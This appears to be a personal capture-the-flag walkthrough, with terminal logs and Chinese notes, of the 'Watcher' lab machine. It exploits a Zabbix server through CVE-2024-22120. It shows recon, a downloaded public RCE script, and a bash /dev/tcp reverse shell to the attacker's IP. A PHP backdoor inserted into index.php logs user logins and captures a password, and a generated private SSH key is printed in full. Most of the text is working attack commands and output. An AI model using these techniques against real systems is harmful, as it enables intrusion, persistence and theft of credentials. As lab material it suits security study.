## Watcher
```
[★]$ nmap -sC -sV 10.129.234.163
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-04 07:47 CST
Nmap scan report for 10.129.234.163
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f0:e4:e7:ae:27:22:14:09:0c:fe:1a:aa:85:a8:c3:a5 (ECDSA)
|_  256 fd:a3:b9:36:17:39:25:1d:40:6d:5a:07:97:b3:42:13 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://watcher.vl/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.23 seconds
[★]$ echo '10.129.234.163 watcher.vl' | sudo tee -a /etc/hosts
10.129.234.163 watcher.vl
```
```
[★]$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://watcher.vl/ -H 'Host: FUZZ.watcher.vl' -fs 4991

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://watcher.vl/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.watcher.vl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 4991
________________________________________________

:: Progress: [1/114441] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro
:: Progress: [117/114441] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er
:: Progress: [201/114441] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er
:: Progress: [291/114441] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er
:: Progress: [381/114441] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er
:: Progress: [465/114441] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er
zabbix                  [Status: 200, Size: 3946, Words: 199, Lines: 33, Duration: 174ms]

```
```
[★]$ sudo sed -i '/10.129.234.163 watcher.vl/s/$/ zabbix.watcher.vl/' /etc/hosts
```
#### 访问浏览器http://zabbix.watcher.vl/
### Foothold
#### Zabbix 具备访客登录功能；如果机器开启了这一功能，我们就能以最低权限访问仪表板。点击 'or sign in as guest'
#### 在底下有Zabbix 7.0.0alpha1. © 2001–2023, Zabbix SIA
#### 在搜索针对此 Zabbix 版本的漏洞时，我们发现了 CVE-2024-22120 这个漏洞。该漏洞需要一个会话 ID 和主机 ID。
#### 由于我们启用了访客登录功能，我们可以对我们的 cookie 进行 base64 解码以获取会话 ID。要获取主机 ID，我们可以查看“库存”并检查其中的主机
https://github.com/W01fh4cker/CVE-2024-22120-RCE/blob/main/CVE-2024-22120-RCE.py
```
[★]$ wget https://raw.githubusercontent.com/W01fh4cker/CVE-2024-22120-RCE/refs/heads/main/CVE-2024-22120-RCE.py
```
#### 在Inventory -> Hosts 鼠标移到 'Zabbix server' 
#### 左下角就会显示http://zabbix.watcher.vl/hostinventories.php?hostid=10084
#### 主机 ID 为 10084 ，这是“库存”中的 Zabbix 服务器。我们将对 cookie 进行 base64 解码，并使用 sessionid 键。
#### Fn12 -> Storage -> Value 粘贴cooike
#### 需要点击'Zabbix server' ，才会出现payload需要的cookie
#### base64: invalid input的原因是       ’ %3D = URL 编码后的 =‘
```
[★]$ echo 'eyJzZXNzaW9uaWQiOiJmMGU3NGZjNzY4MzVlMTAzODRhMTZhODQ2OTFkN2E2ZCIsInNlcnZlckNoZWNrUmVzdWx0Ijp0cnVlLCJzZXJ2ZXJDaGVja1RpbWUiOjE3NzI2Mzc1MTIsInNpZ24iOiI0ZTMwMGE0ZmUyOTE2NTY4OGI4YTllOWI5MWE1YWU0M2YyZjYwZWM4OTRhOWU4YTM0ODgzZmM3M2YyMDE2ZTQ4In0=' | base64 -d
{"sessionid":"f0e74fc76835e10384a16a84691d7a6d","serverCheckResult":true,"serverCheckTime":1772637512,"sign":"4e300a4fe29165688b8a9e9b91a5ae43f2f60ec894a9e8a34883fc73f2016e48"}
```
```
[★]$ python3 CVE-2024-22120-RCE.py --ip zabbix.watcher.vl --sid f0e74fc76835e10384a16a84691d7a6d --hostid 10084
(!) sessionid=e29cc8d946f1a3135fe7ceec60d0ff0d1a3135fe7ceec60d0ff0d
[zabbix_cmd]>>:  whoami
zabbix

[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" &
```
```
[★]$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.15.132] from (UNKNOWN) [10.129.16.76] 41666
bash: cannot set terminal process group (8073): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@watcher:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
zabbix@watcher:/$ ^Z
[1]+  Stopped                 nc -lvnp 1337
┌─[us-dedivip-1]─[10.10.15.132]─[syareya55@htb-k8y76ua84j]─[~]
└──╼ [★]$ stty raw -echo;fg
nc -lvnp 1337
             export TERM=xterm
zabbix@watcher:/$ cat user.txt
```
### Privilege Escalation
```
zabbix@watcher:/usr/share/zabbix$ cat index.php
<SNIP>
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
	CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);

	if (CWebUser::$data['autologin'] != $autologin) {
		API::User()->update([
			'userid' => CWebUser::$data['userid'],
			'autologin' => $autologin
		]);
	}

	$redirect = array_filter([CWebUser::isGuest() ? '' : $request, CWebUser::$data['url'], CMenuHelper::getFirstUrl()]);
	redirect(reset($redirect));
}
</SNIP>
```
#### 手动插入后门
```
zabbix@watcher:/usr/share/zabbix$ vim index.php
zabbix@watcher:/usr/share/zabbix$ cat index.php
<SNIP>
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
	CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
	
	// Backdoor
	  $file = fopen("creds.txt", "a+");
 	fputs($file, "Username: {$_POST['name']} | Password: {$_POST['password']}\n");
 	header("Location: http://127.0.0.1/index.php");
 	fclose($file);	  

	
	if (CWebUser::$data['autologin'] != $autologin) {
		API::User()->update([
			'userid' => CWebUser::$data['userid'],
			'autologin' => $autologin
		]);
	}

	$redirect = array_filter([CWebUser::isGuest() ? '' : $request, CWebUser::$data['url'], CMenuHelper::getFirstUrl()]);
	redirect(reset($redirect));
}
</SNIP>


zabbix@watcher:/usr/share/zabbix$ cat creds.txt
Username: Frank | Password: R%)3S7^Hf4TBobb(gVVs

```
#### 该用户在机器上不存在。检查开放端口时，我们发现了 8111 端口，该端口在 Nmap 扫描中未被检测到。
```
zabbix@watcher:/$ ss -tulnp
Netid State  Recv-Q Send-Q      Local Address:Port  Peer Address:PortProcess                                                                                                                                                                                           
udp   UNCONN 0      0           127.0.0.53%lo:53         0.0.0.0:*                                                                                                                                                                                                     
udp   UNCONN 0      0                 0.0.0.0:68         0.0.0.0:*                                                                                                                                                                                                     
udp   UNCONN 0      0               127.0.0.1:323        0.0.0.0:*                                                                                                                                                                                                     
udp   UNCONN 0      0                   [::1]:323           [::]:*                                                                                                                                                                                                     
tcp   LISTEN 0      151             127.0.0.1:3306       0.0.0.0:*                                                                                                                                                                                                     
tcp   LISTEN 0      4096        127.0.0.53%lo:53         0.0.0.0:*                                                                                                                                                                                                     
tcp   LISTEN 0      4096              0.0.0.0:10051      0.0.0.0:*                                                                                                                                                                                                     
tcp   LISTEN 0      4096              0.0.0.0:10050      0.0.0.0:*    users:(("zabbix_agentd",pid=725,fd=4),("zabbix_agentd",pid=724,fd=4),("zabbix_agentd",pid=723,fd=4),("zabbix_agentd",pid=722,fd=4),("zabbix_agentd",pid=721,fd=4),("zabbix_agentd",pid=704,fd=4))
tcp   LISTEN 0      128               0.0.0.0:22         0.0.0.0:*                                                                                                                                                                                                     
tcp   LISTEN 0      511               0.0.0.0:80         0.0.0.0:*                                                                                                                                                                                                     
tcp   LISTEN 0      70              127.0.0.1:33060      0.0.0.0:*                                                                                                                                                                                                     
tcp   LISTEN 0      50                      *:36099            *:*                                                                                                                                                                                                     
tcp   LISTEN 0      50     [::ffff:127.0.0.1]:50604            *:*                                                                                                                                                                                                     
tcp   LISTEN 0      1      [::ffff:127.0.0.1]:8105             *:*                                                                                                                                                                                                     
tcp   LISTEN 0      100    [::ffff:127.0.0.1]:8111             *:*                                                                                                                                                                                                     
tcp   LISTEN 0      128                  [::]:22            [::]:*                                                                                                                                                                                                     
tcp   LISTEN 0      50     [::ffff:127.0.0.1]:9090             *:*
```
#### 我们可以使用 ssh-keygen 创建一对 SSH 密钥，并执行本地端口转发以访问 8111 TCP 端口。
```
[★]$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.15.132] from (UNKNOWN) [10.129.16.76] 43150
bash: cannot set terminal process group (21788): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@watcher:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
zabbix@watcher:/$ ^Z
[1]+  Stopped                 nc -lvnp 1337
┌─[us-dedivip-1]─[10.10.15.132]─[syareya55@htb-k8y76ua84j]─[~]
└──╼ [★]$ stty raw -echo;fg
nc -lvnp 1337
             export TERM=xterm
zabbix@watcher:/$ cd /var/lib/zabbix
zabbix@watcher:/var/lib/zabbix$ python3 -c 'import pty;pty.spawn("/bin/bash")'
zabbix@watcher:/var/lib/zabbix$ export TERM=xterm
zabbix@watcher:/var/lib/zabbix$ stty rows 40 columns 120
zabbix@watcher:/var/lib/zabbix$ mkdir -p /var/lib/zabbix/.ssh
zabbix@watcher:/var/lib/zabbix$ ls
user.txt
zabbix@watcher:/var/lib/zabbix$ ssh-keygen -t rsa -b 2048 -f /var/lib/zabbix/.ssh/id_rsa -N ""
Generating public/private rsa key pair.
Your identification has been saved in /var/lib/zabbix/.ssh/id_rsa
Your public key has been saved in /var/lib/zabbix/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:8wkKrVsAPfq2G1CW+Tl1WY6nvfRQITh9vIaVo1xvH+g zabbix@watcher.vl
The key's randomart image is:
+---[RSA 2048]----+
|           oo... |
|   . o    o=..B. |
|  . B   . +oo*o+ |
|   = + o . ++oo.o|
|  o o = S . =. .o|
|   o + o + o E  .|
|    = o   o . .  |
|   . =           |
|    +.           |
+----[SHA256]-----+
zabbix@watcher:/var/lib/zabbix$ ls
user.txt
zabbix@watcher:/var/lib/zabbix$ cd .ssh
zabbix@watcher:/var/lib/zabbix/.ssh$ ls
id_rsa	id_rsa.pub
zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa.pub > authorized_keys
zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAmm/ce5vjqisL297Q9ddTDX4y9bC+7tQ3qw2GbZNfnLeeBFnq+dDG
Op48A2FQEveHTgewP2cjpFEGSIk5BViwobzJ81UU905rxgAZzlc4yabp8hUqOAJFks06Ok
+hUjgIBniRv5VYgRgCOMmbp3WB4is4pENpeWmGiVwiOB15QG7yq67mYHy4L0K3rTJyC8Xo
jqMdsHzHCj/QdeB52ZKgWtPW/SJpkDin5wAQ466UbViX4VVDiKCJ35jCVT5Lw3w9Dwal04
st0GO3DR4nPuJ65XVRDfQ/LIW/sEHevRReuzruWrr5//4gajaLfOtIy9VfdBSPQlRTOKeD
TEzvD0opnQAAA8hMLT7nTC0+5wAAAAdzc2gtcnNhAAABAQCab9x7m+OqKwvb3tD111MNfj
L1sL7u1DerDYZtk1+ct54EWer50MY6njwDYVAS94dOB7A/ZyOkUQZIiTkFWLChvMnzVRT3
TmvGABnOVzjJpunyFSo4AkWSzTo6T6FSOAgGeJG/lViBGAI4yZundYHiKzikQ2l5aYaJXC
I4HXlAbvKrruZgfLgvQretMnILxeiOox2wfMcKP9B14HnZkqBa09b9ImmQOKfnABDjrpRt
WJfhVUOIoInfmMJVPkvDfD0PBqXTiy3QY7cNHic+4nrldVEN9D8shb+wQd69FF67Ou5auv
n//iBqNot860jL1V90FI9CVFM4p4NMTO8PSimdAAAAAwEAAQAAAQANARdZRz6r8RT+Diyd
TuTc8X/8BUaGmNMZMbnclzjJWwLQzfuFzqkqfXGDPVn/Rt2bWfVi2V38c6AqUne9NgMlk1
6UAVmTG4TittZ1dA3BmS8A5fxYnARcwLBDAbqNUE+Ir/Vh4wMBV9K0EnHrb28g6s/JsS17
/kFIZrww6nZv0OZWMktb+x+IH0o75m1CEIzH3IHLMjG7s/hwHZa0Y+Yg4fp4hmkGK/fOSO
kz+FMWyJmEl1PWnFAeVBhrFm3CKNMMPt2CCZ6O0ZlS8+Tp6VRxUVtW6a6rV8fmWFfC45Q3
o2sSFzOfpD2/411qyN8a5Zug4VMubVcMz/jxwblP85GXAAAAgBDSf0zecMsiLr0jc7vLtc
sR6KyITL0TmCqgEBBPZMjLhe5+9PRcoYAIHznHn5MWpfmojFAsYgFwMSMNkPvAMNqEtBJy
Ncre+UY9Tx2tcriMB8sdVaS0XUXJLnEgXE2ORZ3iTSnrRSL7wDpKZbxpUG16PKDHNOnZB5
KHL6oGg/cKAAAAgQDOyH5W8F7csJeEmDNvm4ieIuzZYVnCpOAbyqVjJGoQOmtjSNLezqTX
O6VkfmS3/4GY+sR6WLsEqE3UCXDVpHamEYKKZqXFVGytM8IiwHFoT08yWrcN+IG9aO/eru
OWq/3sobO+eMtXsE4NSjYbOVbRDBekHaiJf/Fs8wKbEkLsVwAAAIEAvzHcLOThLfDLhDVS
dO2Lz90wukqLd1qOQEAprYVHnq4HqtCXMC1RM3GivW0Upk+P3eK+4IYasfmniS6Pp5dmBh
b29KAI2GDdxdb7xAWKITE876wGQ2js030wu+v8W0Qpj1N4HHpJAnmbbQzdH9oKR6+jehSe
i3upaTxtpoHM4SsAAAARemFiYml4QHdhdGNoZXIudmwBAg==
-----END OPENSSH PRIVATE KEY-----
zabbix@watcher:/var/lib/zabbix/.ssh$ 


```
```
[★]$ vi id_rs
[★]$ chmod 600 id_rsa
[★]$ ssh -i id_rsa zabbix@watcher.vl -L 8111:127.0.0.1:8111 -N
``
________________________________________
### 也就试了这么多遍 13遍
```
[★]$ python3 CVE-2024-22120-RCE.py --ip zabbix.watcher.vl --sid f0e74fc76835e10384a16a84691d7a6d --hostid 10084
(!) sessionid=e29cc8d946f1a3135fe7ceec60d0ff0d1a3135fe7ceec60d0ff0d
[zabbix_cmd]>>:  whoami
zabbix

[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" &  
Cannot read the response, check connection with the Zabbix server "localhost".
[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
Cannot read the response, check connection with the Zabbix server "localhost".
[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
Cannot read the response, check connection with the Zabbix server "localhost".
[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
Cannot read the response, check connection with the Zabbix server "localhost".
[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
Cannot read the response, check connection with the Zabbix server "localhost".
[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
Cannot read the response, check connection with the Zabbix server "localhost".
[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
Cannot read the response, check connection with the Zabbix server "localhost".
[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
Cannot read the response, check connection with the Zabbix server "localhost".
[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
Cannot read the response, check connection with the Zabbix server "localhost".
[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
Cannot read the response, check connection with the Zabbix server "localhost".
[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
Cannot read the response, check connection with the Zabbix server "localhost".
[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
Cannot read the response, check connection with the Zabbix server "localhost".
[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
Cannot read the response, check connection with the Zabbix server "localhost".
[zabbix_cmd]>>:   

```
